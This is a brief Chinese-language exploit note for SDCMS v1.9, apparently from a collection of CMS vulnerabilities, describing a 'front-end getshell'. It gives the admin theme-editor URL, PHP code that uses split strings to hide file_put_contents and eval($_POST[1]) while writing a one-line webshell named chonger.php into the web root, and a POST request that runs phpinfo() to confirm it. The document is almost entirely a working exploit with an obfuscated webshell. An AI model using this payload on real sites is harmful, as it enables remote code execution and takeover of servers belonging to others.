# SDCMS

---

漏洞：前台getshell

版本：v1.9

```
/sdcms1.9/?m=admin&c=theme&a=index
随便点个php文件进入
---
修改top.php内容
输入：
<?php
$a = 'file_p'.'ut_contents';
$data = '<?php ev'.'al($_PO'.'ST[1])?>';
$a("chonger.php",$data);
?>
---
/sdcms1.9/  就会require到刚修改的top.php，执行php代码生成chonger.php一句话到根目录
/sdcms1.9/chonger.php
postdata：
1=phpinfo();
```

